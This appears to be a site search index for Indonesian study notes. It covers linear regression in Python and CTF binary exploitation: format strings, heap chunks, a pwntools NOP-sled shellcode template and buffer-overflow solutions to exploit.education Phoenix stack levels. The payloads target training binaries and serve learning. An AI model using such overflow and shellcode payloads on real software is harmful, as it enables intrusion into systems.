{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"WeTOFU \u00b6 materi lama sementara tersimpan di kuduscity.github.io Just to ensure the use of mobile browser users","title":"Welcome"},{"location":"#wetofu","text":"materi lama sementara tersimpan di kuduscity.github.io Just to ensure the use of mobile browser users","title":"WeTOFU"},{"location":"ai/apriori/","text":"","title":"Apriori"},{"location":"ai/basics/af/","text":"","title":"Activation Function"},{"location":"ai/basics/bp/","text":"Backpropagation Terakhir update : 9 Arpil 2022 source : StatQuest with Josh Starmer","title":"Backpropagation"},{"location":"ai/basics/cr/","text":"","title":"Chain Rule"},{"location":"ai/basics/lr/","text":"Linear Regression Terakhir update : 9 Arpil 2022 source : StatQuest with Josh Starmer Least Squares \u00b6 \\(y = a*x+b\\) \\(\\sum R = (y - y_1)^2 + (y - y_2)^2 + ... + (y - y_n)^2\\) \\(\\sum R =\\) sum of squared residuals mencari nilai \\(a\\) dan \\(b\\) yang optimal, dalam matematika general ditulis dengan persamaan \\(\\sum R = ((a*x_1 + b) - y_1)^2 + ((a*x_2 + b) - y_2)^2 + ...\\) Code \u00b6 proses perhitungan sangat sulit jika dilakukan secara manual oleh manusia, maka diperlukan bantuan mesin Cara 1 \u00b6 import numpy as np import matplotlib.pyplot as plt x = np . array ([ 0 , 1 , 2 , 3 , 4 ]) y = np . array ([ - 1 , 0.2 , 0.9 , 2.1 , 10 ]) A = np . vstack ([ x , np . ones ( len ( x ))]) . T m , c = np . linalg . lstsq ( A , y , rcond = None )[ 0 ] _ = plt . plot ( x , y , 'o' , label = 'Original data' , markersize = 10 ) _ = plt . plot ( x , m * x + c , 'r' , label = 'Fitted line' ) _ = plt . legend () plt . show () Cara 2 \u00b6 import numpy as np from scipy import optimize import matplotlib.pyplot as plt plt . style . use ( 'seaborn-poster' ) # generate x and y x = np . linspace ( 0 , 1 , 101 ) y = 1 + x + x * np . random . random ( len ( x )) # assemble matrix A A = np . vstack ([ x , np . ones ( len ( x ))]) . T # turn y into a column vector y = y [:, np . newaxis ] # Direct least square regression alpha = np . dot (( np . dot ( np . linalg . inv ( np . dot ( A . T , A )), A . T )), y ) print ( alpha ) # plot the results plt . figure ( figsize = ( 10 , 8 )) plt . plot ( x , y , 'b.' ) plt . plot ( x , alpha [ 0 ] * x + alpha [ 1 ], 'r' ) plt . xlabel ( 'x' ) plt . ylabel ( 'y' ) plt . show ()","title":"Linear Regression"},{"location":"ai/basics/lr/#least-squares","text":"\\(y = a*x+b\\) \\(\\sum R = (y - y_1)^2 + (y - y_2)^2 + ... + (y - y_n)^2\\) \\(\\sum R =\\) sum of squared residuals mencari nilai \\(a\\) dan \\(b\\) yang optimal, dalam matematika general ditulis dengan persamaan \\(\\sum R = ((a*x_1 + b) - y_1)^2 + ((a*x_2 + b) - y_2)^2 + ...\\)","title":"Least Squares"},{"location":"ai/basics/lr/#code","text":"proses perhitungan sangat sulit jika dilakukan secara manual oleh manusia, maka diperlukan bantuan mesin","title":"Code"},{"location":"ai/basics/lr/#cara-1","text":"import numpy as np import matplotlib.pyplot as plt x = np . array ([ 0 , 1 , 2 , 3 , 4 ]) y = np . array ([ - 1 , 0.2 , 0.9 , 2.1 , 10 ]) A = np . vstack ([ x , np . ones ( len ( x ))]) . T m , c = np . linalg . lstsq ( A , y , rcond = None )[ 0 ] _ = plt . plot ( x , y , 'o' , label = 'Original data' , markersize = 10 ) _ = plt . plot ( x , m * x + c , 'r' , label = 'Fitted line' ) _ = plt . legend () plt . show ()","title":"Cara 1"},{"location":"ai/basics/lr/#cara-2","text":"import numpy as np from scipy import optimize import matplotlib.pyplot as plt plt . style . use ( 'seaborn-poster' ) # generate x and y x = np . linspace ( 0 , 1 , 101 ) y = 1 + x + x * np . random . random ( len ( x )) # assemble matrix A A = np . vstack ([ x , np . ones ( len ( x ))]) . T # turn y into a column vector y = y [:, np . newaxis ] # Direct least square regression alpha = np . dot (( np . dot ( np . linalg . inv ( np . dot ( A . T , A )), A . T )), y ) print ( alpha ) # plot the results plt . figure ( figsize = ( 10 , 8 )) plt . plot ( x , y , 'b.' ) plt . plot ( x , alpha [ 0 ] * x + alpha [ 1 ], 'r' ) plt . xlabel ( 'x' ) plt . ylabel ( 'y' ) plt . show ()","title":"Cara 2"},{"location":"ai/boosting/","text":"","title":"Boosting"},{"location":"ai/deeplearning/","text":"","title":"Index"},{"location":"ai/kmeans/","text":"","title":"K-means"},{"location":"ai/knn/","text":"","title":"K-Nearest Neighbors"},{"location":"ai/logr/","text":"","title":"Logistic Regression"},{"location":"ai/naivebayes/","text":"","title":"Naive Bayes"},{"location":"ai/nn/","text":"Neural Network \u00b6","title":"NN"},{"location":"ai/nn/#neural-network","text":"","title":"Neural Network"},{"location":"ai/nn/ann/","text":"","title":"ANN"},{"location":"ai/nn/cnn/","text":"","title":"CNN"},{"location":"ai/randomforest/","text":"","title":"Random Forest"},{"location":"ai/svm/","text":"","title":"SVM"},{"location":"blog/","text":"","title":"Blog"},{"location":"cloud/aws/","text":"","title":"AWS"},{"location":"cloud/google/","text":"","title":"Google Cloud"},{"location":"ctf/","text":"CTF \u00b6 beberapa materi lama dapat diakses di old wetofu","title":"CTF"},{"location":"ctf/#ctf","text":"beberapa materi lama dapat diakses di old wetofu","title":"CTF"},{"location":"ctf/binex/","text":"Basic \u00b6 Check file \u00b6 $ file stack-five stack-five: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped contoh informasi yang dapat diperoleh file ELF 64-bit dynamically linked interpreter not stripped Checksec \u00b6 $ checksec --file=stack-five RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE RW-RPATH No RUNPATH 56 Symbols No 0 1 stack-five Position Independent Executable (PIE): a binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed, randomize location Partial RELRO \u2014 some sections of the binary are read-only, preventing them from being modified Stack Canary \u2014 a value written on the stack which is later checked to ensure it has not been overwritten; used to detect buffer overflows Non-Executable Stack (NX) \u2014 a memory protection mechanism used to prevent shell code located within the stack from being executed, preventing shell code execution Shellcode \u00b6 https://shell-storm.org/shellcode/ Referensi \u00b6 https://www.youtube.com/c/CyberSecurityIPB","title":"Basic"},{"location":"ctf/binex/#basic","text":"","title":"Basic"},{"location":"ctf/binex/#check-file","text":"$ file stack-five stack-five: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped contoh informasi yang dapat diperoleh file ELF 64-bit dynamically linked interpreter not stripped","title":"Check file"},{"location":"ctf/binex/#checksec","text":"$ checksec --file=stack-five RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO No canary found NX disabled No PIE RW-RPATH No RUNPATH 56 Symbols No 0 1 stack-five Position Independent Executable (PIE): a binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed, randomize location Partial RELRO \u2014 some sections of the binary are read-only, preventing them from being modified Stack Canary \u2014 a value written on the stack which is later checked to ensure it has not been overwritten; used to detect buffer overflows Non-Executable Stack (NX) \u2014 a memory protection mechanism used to prevent shell code located within the stack from being executed, preventing shell code execution","title":"Checksec"},{"location":"ctf/binex/#shellcode","text":"https://shell-storm.org/shellcode/","title":"Shellcode"},{"location":"ctf/binex/#referensi","text":"https://www.youtube.com/c/CyberSecurityIPB","title":"Referensi"},{"location":"ctf/binex/bindshellcode/","text":"","title":"Bind Shellcode"},{"location":"ctf/binex/rtl/","text":"","title":"Return to libc"},{"location":"ctf/binex/format/","text":"Format String \u00b6 source ir0nstone.gitbook.io Contoh jika ingin print dengan format specifier int value = 1205 ; printf ( \"Decimal: %d \\n Float: %f \\n Hex: 0x%x\" , value , ( double ) value , value ); output Decimal: 1205 Float: 1205.000000 Hex: 0x4b5 Bug int value = 1205; printf(\"%x %x %x\", value); output 4b5 5659b000 565981b0 nilai parameter diambil dari memori stack, jika tidak cukup parameter pada stack maka akan mengambil next value dari stack parameter contoh #include <stdio.h> int main ( void ) { char buffer [ 30 ]; gets ( buffer ); printf ( buffer ); return 0 ; } $ ./test yes yes $ ./test %x %x %x %x %x f7f74080 0 5657b1c0 782573fc 20782520 penulisan versi panjang printf(\"%x %x %x\", value, value, value); penulisan versi ringkas printf(\"%1$x %1$x %1$x\", value); 1$ artinya mengambil nilai parameter pertama, misal jika ingin mengambil nilai parameter ke 6 maka 6$ , misal %6$p","title":"Format"},{"location":"ctf/binex/format/#format-string","text":"source ir0nstone.gitbook.io Contoh jika ingin print dengan format specifier int value = 1205 ; printf ( \"Decimal: %d \\n Float: %f \\n Hex: 0x%x\" , value , ( double ) value , value ); output Decimal: 1205 Float: 1205.000000 Hex: 0x4b5 Bug int value = 1205; printf(\"%x %x %x\", value); output 4b5 5659b000 565981b0 nilai parameter diambil dari memori stack, jika tidak cukup parameter pada stack maka akan mengambil next value dari stack parameter contoh #include <stdio.h> int main ( void ) { char buffer [ 30 ]; gets ( buffer ); printf ( buffer ); return 0 ; } $ ./test yes yes $ ./test %x %x %x %x %x f7f74080 0 5657b1c0 782573fc 20782520 penulisan versi panjang printf(\"%x %x %x\", value, value, value); penulisan versi ringkas printf(\"%1$x %1$x %1$x\", value); 1$ artinya mengambil nilai parameter pertama, misal jika ingin mengambil nilai parameter ke 6 maka 6$ , misal %6$p","title":"Format String"},{"location":"ctf/binex/format/format0/","text":"","title":"Format0"},{"location":"ctf/binex/format/format1/","text":"","title":"Format1"},{"location":"ctf/binex/format/format2/","text":"","title":"Format2"},{"location":"ctf/binex/format/format3/","text":"","title":"Format3"},{"location":"ctf/binex/format/format4/","text":"","title":"Format4"},{"location":"ctf/binex/heap/","text":"Heap Memory \u00b6 original source https://heap-exploitation.dhavalkapil.com Apa itu? \u00b6 Heap memory dapat dialokasikan secara dinamis. Sehingga program dapat meminta dan melepaskan dari segmen memori kapanpun. Memori heap bersifat global, yang artinya memori dapat diakses dan dimodifikasi dari manapun dalam program. Penggunaan heap memori menggunakan pointer C #include <stdio.h> #include <stdlib.h> int main () { char * str ; /* Initial memory allocation */ str = ( char * ) malloc ( 15 ); strcpy ( str , \"some text\" ); printf ( \"String = %s, Address = %u \\n \" , str , str ); free ( str ); return ( 0 ); } Malloc ( malloc(size_t n) ) Mengembalikan pointer ke chunk yang baru dialokasikan minimal n byte, atau null jika tidak ada ruang yang tersedia. Selain itu, pada kegagalan, errno diatur ke ENOMEM pada sistem ANSI C. Jika n adalah nol, malloc mengembalikan chunk berukuran minimum. (Ukuran minimum adalah 16 byte pada sebagian besar sistem 32bit, dan 24 atau 32 byte pada sistem 64bit.) Pada sebagian besar sistem, size_t adalah tipe yang tidak ditandatangani, jadi panggilan dengan argumen negatif ditafsirkan sebagai permintaan ruang dalam jumlah besar, yang akan sering gagal. Nilai maksimum yang didukung dari n berbeda di seluruh sistem, tetapi dalam semua kasus kurang dari nilai maksimum yang dapat diwakili dari size_t. Free ( free(void* p) ) Melepaskan chunk memori yang ditunjuk oleh p, yang sebelumnya telah dialokasikan menggunakan malloc atau rutin terkait seperti realloc. Ini tidak berpengaruh jika p adalah nol. Ini dapat memiliki efek arbitrer (yaitu, buruk!) jika p telah dibebaskan. Kecuali dinonaktifkan (menggunakan mallopt), mengosongkan ruang yang sangat besar bila memungkinkan, akan secara otomatis memicu operasi yang mengembalikan memori yang tidak digunakan ke sistem, sehingga mengurangi jejak program","title":"Heap Memory"},{"location":"ctf/binex/heap/#heap-memory","text":"original source https://heap-exploitation.dhavalkapil.com","title":"Heap Memory"},{"location":"ctf/binex/heap/#apa-itu","text":"Heap memory dapat dialokasikan secara dinamis. Sehingga program dapat meminta dan melepaskan dari segmen memori kapanpun. Memori heap bersifat global, yang artinya memori dapat diakses dan dimodifikasi dari manapun dalam program. Penggunaan heap memori menggunakan pointer C #include <stdio.h> #include <stdlib.h> int main () { char * str ; /* Initial memory allocation */ str = ( char * ) malloc ( 15 ); strcpy ( str , \"some text\" ); printf ( \"String = %s, Address = %u \\n \" , str , str ); free ( str ); return ( 0 ); } Malloc ( malloc(size_t n) ) Mengembalikan pointer ke chunk yang baru dialokasikan minimal n byte, atau null jika tidak ada ruang yang tersedia. Selain itu, pada kegagalan, errno diatur ke ENOMEM pada sistem ANSI C. Jika n adalah nol, malloc mengembalikan chunk berukuran minimum. (Ukuran minimum adalah 16 byte pada sebagian besar sistem 32bit, dan 24 atau 32 byte pada sistem 64bit.) Pada sebagian besar sistem, size_t adalah tipe yang tidak ditandatangani, jadi panggilan dengan argumen negatif ditafsirkan sebagai permintaan ruang dalam jumlah besar, yang akan sering gagal. Nilai maksimum yang didukung dari n berbeda di seluruh sistem, tetapi dalam semua kasus kurang dari nilai maksimum yang dapat diwakili dari size_t. Free ( free(void* p) ) Melepaskan chunk memori yang ditunjuk oleh p, yang sebelumnya telah dialokasikan menggunakan malloc atau rutin terkait seperti realloc. Ini tidak berpengaruh jika p adalah nol. Ini dapat memiliki efek arbitrer (yaitu, buruk!) jika p telah dibebaskan. Kecuali dinonaktifkan (menggunakan mallopt), mengosongkan ruang yang sangat besar bila memungkinkan, akan secara otomatis memicu operasi yang mengembalikan memori yang tidak digunakan ke sistem, sehingga mengurangi jejak program","title":"Apa itu?"},{"location":"ctf/binex/heap/bc/","text":"","title":"bins & chunks"},{"location":"ctf/binex/heap/cf/","text":"","title":"core functions"},{"location":"ctf/binex/heap/first_fit/","text":"","title":"First Fit"},{"location":"ctf/binex/heap/if/","text":"","title":"internal functions"},{"location":"ctf/binex/heap/malloc_chunk/","text":"Malloc Chunk \u00b6 /*(1)*/ struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size ; /* Size of previous chunk, if it is free. */ INTERNAL_SIZE_T mchunk_size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if this chunk is free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if this chunk is free. */ struct malloc_chunk * bk_nextsize ; }; typedef struct malloc_chunk * mchunkptr ; penggunaan size_t diganti dengan INTERNAL_SIZE_T Alocated Chunk \u00b6 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . | nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ data allocated chunk menggunakan Free Chunk \u00b6 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . | nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"malloc chunk"},{"location":"ctf/binex/heap/malloc_chunk/#malloc-chunk","text":"/*(1)*/ struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size ; /* Size of previous chunk, if it is free. */ INTERNAL_SIZE_T mchunk_size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if this chunk is free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if this chunk is free. */ struct malloc_chunk * bk_nextsize ; }; typedef struct malloc_chunk * mchunkptr ; penggunaan size_t diganti dengan INTERNAL_SIZE_T","title":"Malloc Chunk"},{"location":"ctf/binex/heap/malloc_chunk/#alocated-chunk","text":"chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . | nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ data allocated chunk menggunakan","title":"Alocated Chunk"},{"location":"ctf/binex/heap/malloc_chunk/#free-chunk","text":"chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . | nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Free Chunk"},{"location":"ctf/binex/heap/malloc_state/","text":"","title":"malloc state"},{"location":"ctf/binex/heap/sc/","text":"","title":"security checks"},{"location":"ctf/binex/netfinal/","text":"","title":"Index"},{"location":"ctf/binex/netfinal/final0/","text":"","title":"Final0"},{"location":"ctf/binex/netfinal/final1/","text":"","title":"Final1"},{"location":"ctf/binex/netfinal/final2/","text":"","title":"Final2"},{"location":"ctf/binex/netfinal/net0/","text":"","title":"Net0"},{"location":"ctf/binex/netfinal/net1/","text":"","title":"Net1"},{"location":"ctf/binex/netfinal/net2/","text":"","title":"Net2"},{"location":"ctf/binex/stack/","text":"Stack \u00b6 sumber belajar https://exploit.education/phoenix/ https://ir0nstone.gitbook.io/notes/types/stack NOPs \u00b6 No Operation Instructions, berarti tidak ada instruksi dan lanjut ke instruksi selanjutnya cara membuat: tambahkan banyak NOP pada awal exploit sesuaikan return pointer pada pertengahan NOPs ketimbang awal NOPs dalam assembly intel x86 dan beberapa soal CTF nilai NOP \\x90 contoh: from pwn import * context . binary = ELF ( './vuln' ) p = process () payload = b ' \\x90 ' * 240 # The NOPs payload += asm ( shellcraft . sh ()) # The shellcode payload = payload . ljust ( 312 , b 'A' ) # Padding payload += p32 ( 0xffffcfb4 + 120 ) # Address of the buffer + half nop length log . info ( p . clean ()) p . sendline ( payload ) p . interactive ()","title":"Stack"},{"location":"ctf/binex/stack/#stack","text":"sumber belajar https://exploit.education/phoenix/ https://ir0nstone.gitbook.io/notes/types/stack","title":"Stack"},{"location":"ctf/binex/stack/#nops","text":"No Operation Instructions, berarti tidak ada instruksi dan lanjut ke instruksi selanjutnya cara membuat: tambahkan banyak NOP pada awal exploit sesuaikan return pointer pada pertengahan NOPs ketimbang awal NOPs dalam assembly intel x86 dan beberapa soal CTF nilai NOP \\x90 contoh: from pwn import * context . binary = ELF ( './vuln' ) p = process () payload = b ' \\x90 ' * 240 # The NOPs payload += asm ( shellcraft . sh ()) # The shellcode payload = payload . ljust ( 312 , b 'A' ) # Padding payload += p32 ( 0xffffcfb4 + 120 ) # Address of the buffer + half nop length log . info ( p . clean ()) p . sendline ( payload ) p . interactive ()","title":"NOPs"},{"location":"ctf/binex/stack/stack0/","text":"Stack Zero \u00b6 Soal \u00b6 /* * phoenix/stack-zero, by https://exploit.education * * The aim is to change the contents of the changeme variable. * * Scientists have recently discovered a previously unknown species of * kangaroos, approximately in the middle of Western Australia. These * kangaroos are remarkable, as their insanely powerful hind legs give them * the ability to jump higher than a one story house (which is approximately * 15 feet, or 4.5 metres), simply because houses can't can't jump. */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; printf ( \"%s \\n \" , BANNER ); locals . changeme = 0 ; gets ( locals . buffer ); if ( locals . changeme != 0 ) { puts ( \"Well done, the 'changeme' variable has been changed!\" ); } else { puts ( \"Uh oh, 'changeme' has not yet been changed. Would you like to try \" \"again?\" ); } exit ( 0 ); } Solusi \u00b6 Local Remote python -c \"print('a'*64+'a')\" | ./stack-zero python -c \"print('a'*64+'a')\" | nc 172 .17.0.2 12345","title":"Stack0"},{"location":"ctf/binex/stack/stack0/#stack-zero","text":"","title":"Stack Zero"},{"location":"ctf/binex/stack/stack0/#soal","text":"/* * phoenix/stack-zero, by https://exploit.education * * The aim is to change the contents of the changeme variable. * * Scientists have recently discovered a previously unknown species of * kangaroos, approximately in the middle of Western Australia. These * kangaroos are remarkable, as their insanely powerful hind legs give them * the ability to jump higher than a one story house (which is approximately * 15 feet, or 4.5 metres), simply because houses can't can't jump. */ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; printf ( \"%s \\n \" , BANNER ); locals . changeme = 0 ; gets ( locals . buffer ); if ( locals . changeme != 0 ) { puts ( \"Well done, the 'changeme' variable has been changed!\" ); } else { puts ( \"Uh oh, 'changeme' has not yet been changed. Would you like to try \" \"again?\" ); } exit ( 0 ); }","title":"Soal"},{"location":"ctf/binex/stack/stack0/#solusi","text":"Local Remote python -c \"print('a'*64+'a')\" | ./stack-zero python -c \"print('a'*64+'a')\" | nc 172 .17.0.2 12345","title":"Solusi"},{"location":"ctf/binex/stack/stack1/","text":"Stack One \u00b6 Soal \u00b6 /* * phoenix/stack-one, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x496c5962 * * Did you hear about the kid napping at the local school? * It's okay, they woke up. * */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; printf ( \"%s \\n \" , BANNER ); if ( argc < 2 ) { errx ( 1 , \"specify an argument, to be copied into the \\\" buffer \\\" \" ); } locals . changeme = 0 ; strcpy ( locals . buffer , argv [ 1 ]); if ( locals . changeme == 0x496c5962 ) { puts ( \"Well done, you have successfully set changeme to the correct value\" ); } else { printf ( \"Getting closer! changeme is currently 0x%08x, we want 0x496c5962 \\n \" , locals . changeme ); } exit ( 0 ); } Solusi \u00b6 ./stack-one ` python -c \"import struct; print('a'*64+struct.pack('Q', 0x496c5962).decode('utf-8'))\" `","title":"Stack1"},{"location":"ctf/binex/stack/stack1/#stack-one","text":"","title":"Stack One"},{"location":"ctf/binex/stack/stack1/#soal","text":"/* * phoenix/stack-one, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x496c5962 * * Did you hear about the kid napping at the local school? * It's okay, they woke up. * */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; printf ( \"%s \\n \" , BANNER ); if ( argc < 2 ) { errx ( 1 , \"specify an argument, to be copied into the \\\" buffer \\\" \" ); } locals . changeme = 0 ; strcpy ( locals . buffer , argv [ 1 ]); if ( locals . changeme == 0x496c5962 ) { puts ( \"Well done, you have successfully set changeme to the correct value\" ); } else { printf ( \"Getting closer! changeme is currently 0x%08x, we want 0x496c5962 \\n \" , locals . changeme ); } exit ( 0 ); }","title":"Soal"},{"location":"ctf/binex/stack/stack1/#solusi","text":"./stack-one ` python -c \"import struct; print('a'*64+struct.pack('Q', 0x496c5962).decode('utf-8'))\" `","title":"Solusi"},{"location":"ctf/binex/stack/stack2/","text":"Stack Two \u00b6 Soal \u00b6 /* * phoenix/stack-two, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * If you're Russian to get to the bath room, and you are Finnish when you get * out, what are you when you are in the bath room? * * European! */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; char * ptr ; printf ( \"%s \\n \" , BANNER ); ptr = getenv ( \"ExploitEducation\" ); if ( ptr == NULL ) { errx ( 1 , \"please set the ExploitEducation environment variable\" ); } locals . changeme = 0 ; strcpy ( locals . buffer , ptr ); if ( locals . changeme == 0x0d0a090a ) { puts ( \"Well done, you have successfully set changeme to the correct value\" ); } else { printf ( \"Almost! changeme is currently 0x%08x, we want 0x0d0a090a \\n \" , locals . changeme ); } exit ( 0 ); } Solusi \u00b6 export ExploitEducation=`python -c \"import struct; print('a'*64+struct.pack('Q', 0x0d0a090a).decode('utf-8'))\"` ./stack-two","title":"Stack2"},{"location":"ctf/binex/stack/stack2/#stack-two","text":"","title":"Stack Two"},{"location":"ctf/binex/stack/stack2/#soal","text":"/* * phoenix/stack-two, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * If you're Russian to get to the bath room, and you are Finnish when you get * out, what are you when you are in the bath room? * * European! */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" int main ( int argc , char ** argv ) { struct { char buffer [ 64 ]; volatile int changeme ; } locals ; char * ptr ; printf ( \"%s \\n \" , BANNER ); ptr = getenv ( \"ExploitEducation\" ); if ( ptr == NULL ) { errx ( 1 , \"please set the ExploitEducation environment variable\" ); } locals . changeme = 0 ; strcpy ( locals . buffer , ptr ); if ( locals . changeme == 0x0d0a090a ) { puts ( \"Well done, you have successfully set changeme to the correct value\" ); } else { printf ( \"Almost! changeme is currently 0x%08x, we want 0x0d0a090a \\n \" , locals . changeme ); } exit ( 0 ); }","title":"Soal"},{"location":"ctf/binex/stack/stack2/#solusi","text":"export ExploitEducation=`python -c \"import struct; print('a'*64+struct.pack('Q', 0x0d0a090a).decode('utf-8'))\"` ./stack-two","title":"Solusi"},{"location":"ctf/binex/stack/stack3/","text":"Stack Three \u00b6 Soal \u00b6 Dapat menggunakan gdb atau objdump untuk membantu proses penyelesaian /* * phoenix/stack-three, by https://exploit.education * * The aim is to change the contents of the changeme variable to 0x0d0a090a * * When does a joke become a dad joke? * When it becomes apparent. * When it's fully groan up. * */ #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BANNER \\ \"Welcome to \" LEVELNAME \", brought to you by https: //exploit.education\" char * gets ( char * ); void complete_level () { printf ( \"Congratulations, you've finished \" LEVELNAME \" :-) Well done! \\n 